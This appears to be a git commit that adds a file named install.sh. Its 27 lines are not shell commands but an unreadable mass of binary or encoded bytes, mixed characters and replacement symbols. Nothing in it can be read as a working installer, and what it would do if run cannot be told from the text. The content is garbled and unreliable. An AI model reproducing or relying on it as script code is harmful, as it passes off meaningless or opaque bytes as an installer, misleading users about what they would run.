62575cfd106a40eeaa855abacd96dc014716ea7b
RerezzOffc <thegamergemu0001@gmail.com>
2024-10-01 17:29:23 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,27 @@
+*%KPM7M}YDA
+}i[M}4-7Iek,&zgv+)\gr>y!-A>Оr>x	!-A>D ԓ�E10	!-A>DDDe�	!-A>Оr>yByh眆ا؛nۤzuizx"Z"j{azfu-Wr>y'+O*Z{<}^r>yNR r>y!]wyhDD\r^zRZv)쵩e֥yh眆ByhKPO<0RL%	!-A>Оr>z˝mZ.v)쵩e(KazwyhC~Оr>xdD߈5$,PDG"Оr>xdD߾4'眆yhD	!?5$,P/ByhD	bWyh%yurW(^rKzh܅$$zwyhKPO4'Ԙ4DN]uP4'Byh眆`B9c�IB4$(CM
+wHDL6'HDL5{<}-r>xdD
+HDH	ly!DA
+읺[DDDeByh,LBg-x
+	!YaM ?5N{CByh,F3t(TDC1	 �(CA
+	!Y{<}
+	bWrW쵩ez)쵩e^!W睡!r>x	!-A>HB	4>4'Byh眆<10F�4b
+C RLyh^Vyhٸ)yhfr1jXr>zfF)boi߫HB	?CqHB	?C}SCDKyhm?ܢo݊]vf*[10ODǯ1{ǽvǮ{Ǿqlvǡq<v8Ǐqy@}q\wǮ\{ǯ1\{Ǿ1\{Ǿ\zǯqLv7}qL{ǽ10ODinm&}إn<^kj)|⥺jLkz۫!3(Z؝jKږ'lVܡj	q'z'{u-[az{.v-^Zrܥ~, zߪLq.˝󊟨mLq.'O>zmr>y!-A>Оr>x
+I0,LqByhKPO4'hr}?뢋׫֜)?׫֜)\~m?כ^q(׬l>.v)쵩e)uhw0^Zrܥɪiky-Zجjy{&kۜ*'Zجj{{%y+8hou-WyhC~Оr>xdD߈5$,!KByhC~Оr>z^z{b}!$Lq^!r>x	!-A> ԓ�H>4'Byh.v)(mzirگ0mzir˫iyu(rnz˝j~hjbZ_^/ɪqju-\vvrߟyazaƧn)ex"Z[-i^Zجjy{&kۜ*'Zجj{{%y+8hou-WyhC~Оr>xdD߈5$,!KByhC~Оr>z^z櫭nw,@10O{azwyhKPO4'RL"C�Оr>x	!zvɩ)ߢ)Zں{nצhIfr>y,jˤy0jm4*i4!XƬIX
+躘m?ЫyK ҿ=!XƬIXZwi
+t
++4ة]z^)Z֫j˝ǝ+ ҿX4뢋׫֜)(*m('z{l֬j[
+j)ޮ1h~4D,JdNP?-^ZrܥzrܢjhZj
+!nt*'zl˝ǝ+ ҿsK,J!.뢋׫֜)(*m('z{l֬j[
+j)ޮ1hr}?뢋׫֜)?׫֜)\~m?כ^q(׬l>.v)쵩e)uhw0^Zrܥɪiky-Zجjy{&kۜ*'Zجj{{%y+8hou-WyhC~Оr>xdD߈5$,!KByhC~Оr>z^z^ǞrrXj{bu/jX)ZF)b_wRx֥^맊{-jYy!r>x	!-A>BLD>4'Byhڲ.Xm?+az(ק&}إn<^j)Z!yh眆7	!DA
+11CIB/	!DA
+Byh%yvrW)쵩e^y^ڲyhKPO4'RL"C�Оr>x	!甝ۡ~)^뢋lm+a("b]azf?-$ڑzצj뢋l-^ZrܥIbצjG>׫֜)lOu-_ju-R'֥6^Z˫iyu(rnz˝j~hjbZ_^.v/ɪ"{-jW^z{"uۺ)]qju-\vvrߟyazaƧ(+jײjۺ)]bzaƧ'rWvZثzKh+j+8hou-WyhC~Оr>xdD߈5$,!KByhC~Оr>z^z{j׿^yh眆ByhKPOD@ӃByhKPO4'ڲ"֢uڭ$jyڙh"*'vzwLjˤz+")hqbz+bziߩ1.Fvwh$jyڙuujgy~ƬIuZkjjiߩ1.FjȦgbK)iǝjV0bO쥧$jrr'eȝQb-u-W0^Zrܥyh*ޒ+؝jGb鮑+u1雹eFijb閇*'eƭ*'׬r*'LzfjuڮaƧzzfxC^vzZjب^بZmf'譩jgbO쥧v+$Zqt<m6گbomzir鞰Cyh眆7	!DA
+$D1
+818  RPKByhC~Оr>z^z{Z_jwyh眆ByhKPO4RL<D/ByhKPO4'm!rm?^Zrܥ)쵩ezr,8WyhC~Оr>xdDߔ4RL<D-%
+HD4'7	!笕^jwǜyhKPO4'#DE4d4'ByhۊjL{Zzn$zwZ*^.iߩ1.F*'~(.鞞6jy"px,1jVzl^e֫.v2צrl)!r>xdD߾4'74RQ ђIB/	!DA
+Byh%yvrWbHZrFrOjwyh眆ByhKPO�"�"�Оr>x	!猊{Zzn֫jwLjˤԱjgjwǫZ(h)ۊj\wگ0mzir!8zKh+buצF{Ǧn歖&ڮaƧfxC!ii r!r>xdD߾4'7
+P, �Оr>xdD߾4'Wg.mi!r>xdD߾4'7�sI%D5OKByhC~Оr>zwLjˤ+y~ƬIIZ
+Zi8WyhC~Оr>xdD߆�=eOI%
+HD4'7	!笕bC{*mv+)\gZ_^rOGzyyh眆D@  ByhD    ByhD   ByhD 
+	!8  ByhD  쵩ez^4'D@  4'D@  M^DDDesLF4'D@ �ybNP	!8  )Ji[{<}M	!8 4'D@ByhD 4'D@ByhD 4'D@4'yhDDLLRLyhԉ쵩ey!e'{-jYmyh*'~(.增r8
+hu眆T)쵩e=ޕ!zYZ8^眆iijwyhFڄǜD+^r>xƬIƷw?sG%yjǌ?sH)쵩e^)쵩e^ܢw{un)쵩ez^Z_Jמ$m$z_.miuJbG(Z؝jKږ'lVܡjw
